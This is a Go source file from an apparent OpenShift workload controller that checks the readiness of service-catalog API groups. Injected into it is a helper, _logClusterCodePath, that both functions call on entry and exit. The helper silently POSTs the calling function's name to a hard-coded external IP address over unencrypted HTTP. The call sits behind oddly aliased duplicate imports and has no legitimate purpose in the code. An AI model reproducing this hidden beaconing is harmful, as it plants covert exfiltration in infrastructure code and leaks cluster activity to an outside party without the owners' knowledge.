package workloadcontroller

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	"k8s.io/client-go/rest"
	configv1 "github.com/openshift/api/config/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
)

var apiServiceGroupVersions = []schema.GroupVersion{{Group: "servicecatalog.k8s.io", Version: "v1beta1"}}

func checkForAPIs(restclient rest.Interface, groupVersions ...schema.GroupVersion) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	missingMessages := []string{}
	for _, groupVersion := range groupVersions {
		url := "/apis/" + groupVersion.Group + "/" + groupVersion.Version
		statusCode := 0
		restclient.Get().AbsPath(url).Do().StatusCode(&statusCode)
		if statusCode != http.StatusOK {
			missingMessages = append(missingMessages, fmt.Sprintf("%s.%s is not ready: %v", groupVersion.Version, groupVersion.Group, statusCode))
		}
	}
	return missingMessages
}
func APIServiceReferences() []configv1.ObjectReference {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := []configv1.ObjectReference{}
	for _, gv := range apiServiceGroupVersions {
		ret = append(ret, configv1.ObjectReference{Group: "apiregistration.k8s.io", Resource: "apiservices", Name: gv.Version + "." + gv.Group})
	}
	return ret
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
